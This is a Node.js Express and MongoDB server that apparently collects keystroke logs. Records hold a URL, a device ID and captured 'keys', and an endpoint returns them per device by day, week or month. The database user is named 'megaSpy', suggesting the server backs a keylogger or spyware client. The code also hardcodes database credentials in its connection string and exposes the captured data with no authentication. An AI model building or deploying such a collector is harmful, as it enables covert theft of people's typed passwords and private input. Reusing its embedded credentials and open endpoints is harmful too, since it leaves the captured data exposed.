const app = require('express')();
const mongoose = require('mongoose');
const cors = require('cors');
const bodyParser = require('body-parser');
const Log = require('./models/log');

app.use(cors());
app.use(bodyParser.json());

Date.prototype.getWeek = function(){
    const day_miliseconds = 86400000,
        onejan = new Date(this.getFullYear(),0,1,0,0,0),
        onejan_day = (onejan.getDay()===0) ? 7 : onejan.getDay(),
        days_for_next_monday = (8-onejan_day),
        onejan_next_monday_time = onejan.getTime() + (days_for_next_monday * day_miliseconds),
        first_monday_year_time = (onejan_day>1) ? onejan_next_monday_time : onejan.getTime(),
        this_date = new Date(this.getFullYear(), this.getMonth(),this.getDate(),0,0,0),// This at 00:00:00
        this_time = this_date.getTime(),
        days_from_first_monday = Math.round(((this_time - first_monday_year_time) / day_miliseconds));

    const first_monday_year = new Date(first_monday_year_time);
    return (days_from_first_monday>=0 && days_from_first_monday<364) ? Math.ceil((days_from_first_monday+1)/7) : 52;
};

const getDailyLogs = async (deviceId) =>{
    try {
        const day = new Date().getDate();
        const week = new Date().getWeek();
        const month = new Date().getMonth();
        const year = new Date().getFullYear();
        return await Log.find({
            day,
            week,
            month,
            year,
            deviceId
        });
    }catch(e){
        return null;
    }
};

const getWeeklyLogs = async (deviceId) =>{
    try {
        const week = new Date().getWeek();
        const month = new Date().getMonth();
        const year = new Date().getFullYear();
        return await Log.find({
            week,
            month,
            year,
            deviceId
        });
    }catch(e){
        return null;
    }
};

const getMonthlyLogs = async (deviceId) =>{
    try {
        const month = new Date().getMonth();
        const year = new Date().getFullYear();
        return await Log.find({
            month,
            year,
            deviceId
        });
    }catch(e){
        return null;
    }
};

app.post('/addLog',async (req,res)=>{
    try{
        const logData = req.body;
        const date = new Date(logData.date);
        const year = date.getFullYear();
        const month = date.getMonth();
        const week = date.getWeek();
        const day = date.getDate();
        const log = new Log({
            year,
            month,
            week,
            day,
            url: logData.url,
            deviceId: logData.deviceId,
            keys: logData.keys,
            dateAsStr: logData.date
        });
        await log.save();
    }catch(e){
        console.log(e);
        return res.status(500).send({ok:false})
    }
    return res.status(200).send({ok:true})
});

app.get('/logs',async (req,res)=>{
    try {
        const deviceId = req.query.deviceId;
        const interval = +req.query.interval;
        if (!deviceId || !interval) {
            throw new Error('no required data provided')
        }
        let data;
        switch (interval) {
            case 1:
                data = await getDailyLogs(deviceId);
                break;
            case 2:
                data = await getWeeklyLogs(deviceId);
                break;
            case 3:
                data = await getMonthlyLogs(deviceId);
                break;
            default:
                return res.status(400).send({ok: false})
        }
        return res.status(200).send(data);
    }catch(e){
        return res.status(400).send({ok: false,error:e.message})
    }
});

mongoose.connect('mongodb+srv://megaSpy:123321@logs-xjeen.gcp.mongodb.net/test?retryWrites=true&w=majority')
    .then(()=>{
        console.log('connection established on port 3000');
        app.listen(3000);
    })
    .catch((e)=>console.log(e));


